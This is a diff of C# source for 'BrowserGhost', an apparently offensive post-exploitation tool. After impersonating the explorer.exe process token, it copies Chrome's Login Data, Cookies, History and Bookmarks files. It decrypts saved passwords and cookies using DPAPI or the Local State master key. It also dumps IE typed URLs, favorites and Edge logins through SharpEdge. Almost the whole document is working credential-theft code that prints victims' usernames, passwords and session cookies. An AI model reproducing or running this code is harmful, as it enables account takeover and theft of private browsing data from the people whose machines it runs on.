@@ -1,21 +1,15 @@
-﻿using System;
+using System;
 using System.Data;
-
 using System.Security.Cryptography;
 using System.Text;
 using System.Diagnostics;
-
 using System.IO;
-
 using CS_SQLite3;
-
 using System.Management;
-
 using System.Runtime.InteropServices;
-
-
-
-
+using Microsoft.Win32;
+using System.Text.RegularExpressions;
+using SharpEdge;
 
 
 namespace BrowserGhost
@@ -308,6 +302,249 @@ namespace BrowserGhost
             }
         }
 
+        public static bool Chrome_history()
+        {
+            string chrome_History_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
+            if (File.Exists(chrome_History_path) == true)
+            {
+                
+                string cookie_tempFile = Path.GetTempFileName();
+                File.Copy(chrome_History_path, cookie_tempFile, true);
+
+                Console.WriteLine("\t[+] Copy {0} to {1}", chrome_History_path, cookie_tempFile);
+
+                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);
+                string query = "select url,title from urls";
+                DataTable resultantQuery = database.ExecuteQuery(query);
+                foreach (DataRow row in resultantQuery.Rows)
+                {
+                    string url;
+                    string title;
+                    try
+                    {
+                        url = (string)row["url"];
+                        title = (string)row["title"];
+                    }
+                    catch
+                    {
+                        continue;
+
+                    }
+                    
+                    
+                    Console.WriteLine("\t{0} \t {1}", url, title);
+
+                }
+                database.CloseDatabase();
+                System.IO.File.Delete(cookie_tempFile);
+                Console.WriteLine("\t[+] Delete File {0}", cookie_tempFile);
+
+            }
+            else
+            {
+                Console.WriteLine("[-] {0} Not Found!", chrome_History_path);
+            }
+
+            return true;
+        }
+
+
+
+        public static bool Chrome_cookies()
+        {
+            string chrome_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
+            if (File.Exists(chrome_cookie_path) == true)
+            {
+                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
+                string cookie_tempFile = Path.GetTempFileName();
+                File.Copy(chrome_cookie_path, cookie_tempFile, true);
+
+                Console.WriteLine("\t[+] Copy {0} to {1}", chrome_cookie_path, cookie_tempFile);
+
+                SQLiteDatabase database = new SQLiteDatabase(cookie_tempFile);
+                string query = "SELECT host_key, name,encrypted_value FROM cookies";
+                DataTable resultantQuery = database.ExecuteQuery(query);
+                foreach (DataRow row in resultantQuery.Rows)
+                {
+                    string host_key = (string)row["host_key"].ToString();
+                    string name = (string)row["name"].ToString();
+                    byte[] cookieBytes = Convert.FromBase64String((string)row["encrypted_value"].ToString());
+                    string cookie_value;
+                    try
+                    {
+                        //老版本解密
+                        cookie_value = Encoding.UTF8.GetString(ProtectedData.Unprotect(cookieBytes, null, DataProtectionScope.CurrentUser));
+
+                        //Console.WriteLine("{0} {1} {2}", originUrl, username, password);
+                    }
+                    catch (Exception ex) //如果异常了就用新加密方式尝试
+                    {
+
+                        byte[] masterKey = GetMasterKey(chrome_state_file);
+                        cookie_value = DecryptWithKey(cookieBytes, masterKey);
+
+
+                    }
+                    Console.WriteLine("\t[{0}] \t {1}={2}",host_key,name, cookie_value);
+                    
+                }
+                database.CloseDatabase();
+                System.IO.File.Delete(cookie_tempFile);
+                Console.WriteLine("\t[+] Delete File {0}", cookie_tempFile);
+
+            }
+            else
+            {
+                Console.WriteLine("[-] {0} Not Found!", chrome_cookie_path);
+            }
+
+            return true;
+        }
+
+
+        //偷个懒 后面再解析json
+        public static bool Chrome_books()
+        {
+            string chrome_book_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Bookmarks";
+            if (File.Exists(chrome_book_path) == true)
+            {
+
+                string booktext = File.ReadAllText(chrome_book_path);
+                Console.WriteLine(booktext);
+
+
+            }
+            else
+            {
+                Console.WriteLine("[-] {0} Not Found!", chrome_book_path);
+            }
+                
+            return true;
+        }
+        public static bool Chrome_logins()
+        {
+            //copy login data
+            string login_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
+
+            if (File.Exists(login_data_path) == true)
+            {
+                string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
+                string login_data_tempFile = Path.GetTempFileName();
+                File.Copy(login_data_path, login_data_tempFile, true);
+
+                Console.WriteLine("\t[+] Copy {0} to {1}", login_data_path, login_data_tempFile);
+
+                SQLiteDatabase database = new SQLiteDatabase(login_data_tempFile);
+                string query = "SELECT origin_url, username_value, password_value FROM logins";
+                DataTable resultantQuery = database.ExecuteQuery(query);
+
+                foreach (DataRow row in resultantQuery.Rows)
+                {
+                    string url;
+                    string username;
+                    string password;
+                    string crypt_password;
+                    url = (string)row["origin_url"].ToString();
+                    username = (string)row["username_value"].ToString();
+                    crypt_password = row["password_value"].ToString();
+
+
+                    byte[] passwordBytes = Convert.FromBase64String(crypt_password);
+                    
+                    try
+                    {
+                        //老版本解密
+                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
+
+                        //Console.WriteLine("{0} {1} {2}", originUrl, username, password);
+                    }
+                    catch (Exception ex) //如果异常了就用新加密方式尝试
+                    {
+
+                        byte[] masterKey = GetMasterKey(chrome_state_file);
+                        password = DecryptWithKey(passwordBytes, masterKey);
+
+
+                    }
+
+
+                    Console.WriteLine("\t[URL] -> {0}\n\t[USERNAME] -> {1}\n\t[PASSWORD] -> {2}\n", url, username, password);
+                    
+
+                }
+                database.CloseDatabase();
+                System.IO.File.Delete(login_data_tempFile);
+                Console.WriteLine("\t[+] Delete File {0}", login_data_tempFile);
+            }
+            else
+            {
+                Console.WriteLine("[-] {0} Not Found!", login_data_path);
+            }
+
+                
+            
+            return false;
+        }
+
+        public static bool IE_history()//system 获取history时有点问题 
+        {
+            string info = "";
+
+            RegistryKey Key;
+
+            Key = Registry.CurrentUser;
+            RegistryKey myreg = Key.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
+            string[] urls = new string[26];
+
+            for (int i = 1; i < 26; i++)
+            {
+                try
+                {
+                    info = myreg.GetValue("url" + i.ToString()).ToString();
+                    
+                    urls[i] = info;
+                }
+                catch
+                {
+                    ;
+                }
+            }
+            foreach (string url in urls)
+            {
+                if (url != null)
+                {
+                    Console.WriteLine("\t{0}", url);
+                }
+
+            }
+
+          
+            return true;
+        }
+
+        public static bool IE_books()
+        {
+            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
+
+            string[] files = Directory.GetFiles(book_path, "*.url", SearchOption.AllDirectories);
+
+            foreach (string url_file_path in files)
+            {
+                if (File.Exists(url_file_path) == true)
+                {
+
+                    string booktext = File.ReadAllText(url_file_path);
+
+                    Match match = Regex.Match(booktext, @"URL=(.*?)\n");
+                    Console.WriteLine("\t" + url_file_path);
+                    Console.WriteLine("\t\t" + match.Value);
+
+                }
+            }
+
+            return true;
+        }
+
         static void Main(string[] args)
         {
 
@@ -325,70 +562,48 @@ namespace BrowserGhost
                 if (processname == "explorer")
                 {
 
-                    Console.WriteLine("[+] [{0}] [{1}] [{2}]", pid, processname, process_of_user);
+                    Console.WriteLine("[*] [{0}] [{1}] [{2}]", pid, processname, process_of_user);
 
                     ImpersonateProcessToken(pid);
-                    Console.WriteLine("[+] Impersonate user {0}", Environment.UserName);
-                    Console.WriteLine("[+] Current user {0}", Environment.UserName);
+                    Console.WriteLine("[*] Impersonate user {0}", Environment.UserName);
+                    Console.WriteLine("[*] Current user {0}", Environment.UserName);
 
+                    Console.WriteLine("===============Chrome=============");
+                    //密码
+                    Console.WriteLine("\n[*]Get Chrome Login Data");
+                    Chrome_logins();
+                    
+                    //获取书签
+                    Console.WriteLine("\n[*]Get Chrome Bookmarks");
+                    Chrome_books();
 
-                    //copy login data
-                    string login_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
-                    string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
-                    string login_data_tempFile = Path.GetTempFileName();
-                    File.Copy(login_data_path, login_data_tempFile, true);
+                    //cookie
+                    Console.WriteLine("\n[*]Get Chrome Cookie");
+                    Chrome_cookies();
 
-                    Console.WriteLine("[+] Copy {0} to {1}", login_data_path, login_data_tempFile);
+                    Console.WriteLine("\n[*]Get Chrome History");
+                    Chrome_history();
 
-                    SQLiteDatabase database = new SQLiteDatabase(login_data_tempFile);
-                    string query = "SELECT origin_url, username_value, password_value FROM logins";
-                    DataTable resultantQuery = database.ExecuteQuery(query);
+                    //-----------------------IE----------------
 
-                    foreach (DataRow row in resultantQuery.Rows)
-                    {
-                        string url;
-                        string username;
-                        try
-                        {
-                             url = (string)row["origin_url"];
-                             username = (string)row["username_value"];
-                        }
-                        catch
-                        {
-                            continue;
-                        }
-                        
-                        
-                        byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
-                        string password;
-                        try
-                        {
-                            //老版本解密
-                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
-                            
-                            //Console.WriteLine("{0} {1} {2}", originUrl, username, password);
-                        }
-                        catch (Exception ex) //如果异常了就用新加密方式尝试
-                        {
+                    Console.WriteLine("===============IE=============");
 
-                            byte[] masterKey = GetMasterKey(chrome_state_file);
-                            password = DecryptWithKey(passwordBytes, masterKey);
+                    
 
+                    Console.WriteLine("\n[*]Get IE Books");
+                    IE_books();
 
-                        }
+                    Console.WriteLine("\n[*]Get IE Password");
+                    Edge.GetLogins(); //.net2 提取这个密码太复杂了 参考至 https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs
 
-
-                        Console.WriteLine("\tURL -> {0}\n\tUSERNAME -> {1}\n\tPASSWORD -> {2}\n", url, username, password);
-
-                    }
-                    database.CloseDatabase();
-                    System.IO.File.Delete(login_data_tempFile);
-                    Console.WriteLine("[+] Delete File {0}", login_data_tempFile);
+                    Console.WriteLine("\n[*]Get IE History");
+                    IE_history();
+                    
                     //回退权限
                     RevertToSelf();
-                    Console.WriteLine("[+] Recvtoself");
-                    Console.WriteLine("[+] Current user {0}", Environment.UserName);
-                    break;
+                    Console.WriteLine("[*] Recvtoself");
+                    Console.WriteLine("[*] Current user {0}", Environment.UserName);
+                    
 
                 }
 
